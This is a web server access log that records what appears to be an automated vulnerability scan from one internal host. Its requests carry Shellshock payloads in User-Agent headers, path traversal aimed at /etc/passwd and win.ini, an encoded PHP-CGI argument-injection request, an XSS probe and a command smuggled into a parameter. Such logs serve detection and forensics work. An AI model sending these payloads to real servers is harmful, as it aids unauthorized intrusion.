192.168.2.50 - - [27/May/2017:07:42:24 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /trace.axd HTTP/1.1" 404 506 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /cgi-bin/test.sh HTTP/1.1" 404 512 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /cgi-bin/test-cgi HTTP/1.1" 404 513 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /user_settings.cfg HTTP/1.1" 404 514 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1" 404 501 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /index.jsp HTTP/1.1" 404 506 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /cgi-bin/upload.cgi HTTP/1.1" 404 515 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 517 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /index.jsp HTTP/1.1" 404 524 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 516 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /_mt/mt.cgi HTTP/1.1" 404 506 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "POST /%70%68%70%70%61%74%68/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1" 404 508 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /admin.cgi HTTP/1.1" 404 506 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /cgi-bin/wa HTTP/1.1" 404 507 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "POST /FormHandler.cgi HTTP/1.1" 404 512 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /cgi-bin/wa.cgi HTTP/1.1" 404 511 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /administrator.cgi HTTP/1.1" 404 514 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /enter.php?goto=%2F HTTP/1.1" 404 506 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-bin/wa.exe HTTP/1.1" 404 511 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /buglist.cgi HTTP/1.1" 404 508 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /././.. HTTP/1.1" 400 490 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi/mid.cgi HTTP/1.1" 404 508 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /.%252e/.%252e/.%252e/.%252e/windows/win.ini HTTP/1.1" 404 532 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 517 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1" 400 490 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-bin/admin.cgi HTTP/1.1" 404 514 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /.%252e/.%252e/.%252e/.%252e/winnt/win.ini HTTP/1.1" 404 530 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-mod/index.cgi HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-bin/admin.pl HTTP/1.1" 404 513 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1" 404 542 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 523 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 518 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET / HTTP/1.1" 400 0 "-" "-"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /struts/webconsole.html HTTP/1.1" 404 519 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 522 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 515 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET / HTTP/1.1" 400 0 "-" "-"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /index.cgi HTTP/1.1" 404 506 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /cgi-bin/count.cgi HTTP/1.1" 404 514 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:47 -0500] "GET /index.pl HTTP/1.1" 404 505 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:49 -0500] "GET /login?user=**%3Cscript%3EJavaScript:alert('cpanel_login_user_xss.nasl')%3B%3C%2Fscript%3E HTTP/1.1" 404 502 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /axis/DirectDownload.jsp HTTP/1.1" 404 520 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /cgi-bin/Count.cgi HTTP/1.1" 404 514 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /index.jsp%00x HTTP/1.1" 404 506 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /index.sh HTTP/1.1" 404 505 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 519 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /nph-mr.cgi HTTP/1.1" 404 507 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 520 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "OPTIONS * HTTP/1.1" 200 163 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1" 404 517 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /query.cgi HTTP/1.1" 404 506 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 517 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /wswwgw1.html HTTP/1.1" 404 509 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /cgi-bin/filescan HTTP/1.1" 404 513 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 518 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /session_login.cgi HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "PUT /wswwgw1.html HTTP/1.1" 405 571 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /cgi-bin/help.cgi HTTP/1.1" 404 513 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /wswwgw1.html HTTP/1.1" 404 508 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /show_bug.cgi HTTP/1.1" 404 509 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET / HTTP/1.1" 417 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /cgi-bin/hi HTTP/1.1" 404 507 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /OvCgi/freeIPaddrs.ovpl?netnum=127.0.0.1&netmask=255.255.255.0&netid=127.0.0.1%20|%20id| HTTP/1.1" 404 519 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:50 -0500] "GET /test HTTP/1.1" 404 501 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/index.cgi HTTP/1.1" 404 514 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /test.cgi HTTP/1.1" 404 505 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/index.pl HTTP/1.1" 404 513 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 520 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/index.sh HTTP/1.1" 404 513 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /whois.cgi HTTP/1.1" 404 506 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /wp-login.php HTTP/1.1" 404 509 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/mailit.pl HTTP/1.1" 404 514 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 520 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /wwwadmin.cgi HTTP/1.1" 404 509 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 519 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /wwwboard.cgi HTTP/1.1" 404 509 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 527 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /xampp/cgi.cgi HTTP/1.1" 404 510 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 526 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 520 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 519 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/search HTTP/1.1" 404 511 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/search.cgi HTTP/1.1" 404 515 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 522 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/test.cgi HTTP/1.1" 404 513 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/test.sh HTTP/1.1" 404 512 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:53 -0500] "GET /cgi-bin/test-cgi HTTP/1.1" 404 513 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:56 -0500] "GET /cgi-bin/upload.cgi HTTP/1.1" 404 515 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:56 -0500] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 517 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:56 -0500] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 516 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:56 -0500] "GET /cgi-bin/wa HTTP/1.1" 404 507 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /cgi-bin/wa.cgi HTTP/1.1" 404 511 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /cgi-bin/wa.exe HTTP/1.1" 404 511 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 514 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 517 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /cgi-mod/index.cgi HTTP/1.1" 404 514 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 523 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 522 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /index.cgi HTTP/1.1" 404 506 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /index.pl HTTP/1.1" 404 505 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
172.16.0.2 - - [27/May/2017:16:59:57 -0500] "GET /index.sh HTTP/1.1" 404 505 "-" "() { _; } >_[$($())] { echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6278 Output : $((11+78))\"; }"
